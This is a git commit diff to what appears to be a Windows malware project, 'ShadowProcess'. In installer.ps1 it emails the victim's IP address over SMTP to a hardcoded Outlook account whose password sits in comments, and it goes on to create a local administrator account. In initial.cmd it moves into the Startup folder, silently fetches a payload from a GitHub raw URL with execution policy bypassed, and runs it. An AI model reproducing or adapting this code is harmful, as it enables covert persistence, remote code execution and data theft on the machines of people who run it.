78cd1d170aecebb8d5f7119be5456a014e2c3541
tobiasasa <tobias.asa@hotmail.com>
2022-09-23 09:16:23 -0700

    qwe123

--- files/installer.ps1
+++ files/installer.ps1
@@ -11,10 +11,10 @@ $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = $PWD.Path
  
-#processdata@outlook.es
-#procesandodatos123$!
+#processdata123@outlook.es
+#ProcesandoDatos123$!
 #enviando ip por smtp
-powershell $EmailFrom = "processdata@outlook.es";$EmailTo = "processdata@outlook.es";$Subject = "Nueva conexión:";$SMTPServer = "smtp.outlook.com";$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress | Out-string;$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPClient.EnableSsl = $true;$message = New-Object System.Net.Mail.MailMessage $EmailFrom, $EmailTo;$message.Subject = $Subject;$message.IsBodyHTML = $true;$message.Body = "$ip";$pass = Read-Host "procesandodatos123$!" -AsSecureString; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $pass); $SMTPClient.Send($message)
+powershell $EmailFrom = "processdata123@outlook.es";$EmailTo = "processdata123@outlook.es";$Subject = "Nueva conexión:";$SMTPServer = "smtp.outlook.com";$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress | Out-string;$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPClient.EnableSsl = $true;$message = New-Object System.Net.Mail.MailMessage $EmailFrom, $EmailTo;$message.Subject = $Subject;$message.IsBodyHTML = $true;$message.Body = "$ip";$pass = Read-Host "ProcesandoDatos123$!" -AsSecureString; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $pass); $SMTPClient.Send($message)
 
 #Creando administrador local
 function Create-NewLocalAdmin {
--- initial.cmd
+++ initial.cmd
@@ -7,12 +7,11 @@ set "INITIALPATH=%cd%"
 @REM definr directorio inicio de programas.
 set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 
-
 @REM Dirigirse al direcrotio del inicio de windows.
 cd  %STARTUP%
 
 @REM Ejecutar payloads al inicio.
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/wget.cmd -OutFile wget.cmd"
+powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/wget.cmd -OutFile wget.cmd"
 
 @REM Corriendo el payload
 powershell powershell.exe -windowstyle hidden -ep bypass ./wget.cmd
